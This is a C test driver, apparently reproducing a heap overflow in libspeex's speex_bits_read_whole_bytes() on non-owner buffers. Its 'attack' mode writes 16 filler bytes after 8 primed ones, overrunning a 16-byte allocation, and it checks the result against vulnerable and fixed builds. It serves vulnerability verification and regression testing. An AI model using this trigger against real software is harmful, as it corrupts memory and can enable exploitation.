/* Driver for CVE-2026-116741: speex_bits_read_whole_bytes() non-owner
 * truncation. Builds against an unmodified libspeex 1.2.1 static library
 * (or the vendor-fixed tree) through public headers only. */
#include <speex/speex_bits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSZ 16

int main(int argc, char **argv)
{
   const char *mode = argc > 1 ? argv[1] : "attack";
   int attack = strcmp(mode, "attack") == 0 || strcmp(mode, "fixed") == 0;
   char *buf = (char *)malloc(BUFSZ);
   SpeexBits bits;
   char seed[8];
   char payload[16];
   int i, len, nbytes;

   if (!buf)
      return 90;
   memset(buf, 0, BUFSZ);

   /* Non-owner buffer: owner == 0, buf_size == 16. */
   speex_bits_init_buffer(&bits, buf, BUFSZ);

   /* Prime 8 bytes: nbBits = 64, so pos = nbBits / 8 = 8. */
   for (i = 0; i < 8; i++)
      seed[i] = (char)(0x11 + i);
   speex_bits_read_whole_bytes(&bits, seed, 8);

   /* Vulnerable branch: nchars = buf_size = 16 regardless of the 8 bytes
    * already present, so 16 bytes are written at pos 8..23: payload[0..7]
    * land in bounds and payload[8..15] land past the 16-byte allocation. */
   for (i = 0; i < 16; i++)
      payload[i] = (char)('A' + i);
   len = attack ? 16 : 8;
   speex_bits_read_whole_bytes(&bits, payload, len);

   nbytes = speex_bits_nbytes(&bits);
   printf("mode=%s nbytes=%d nbBits=%d owner=%d buf_size=%d\n",
          mode, nbytes, bits.nbBits, bits.owner, bits.buf_size);
   printf("buffer=");
   for (i = 0; i < BUFSZ; i++)
      printf("%02x", (unsigned char)buf[i]);
   printf("\n");

   speex_bits_destroy(&bits);
   free(buf);
   return nbytes == (strcmp(mode, "fixed") == 0 ? 15 : attack ? 24 : 16) ? 0 : 1;
}
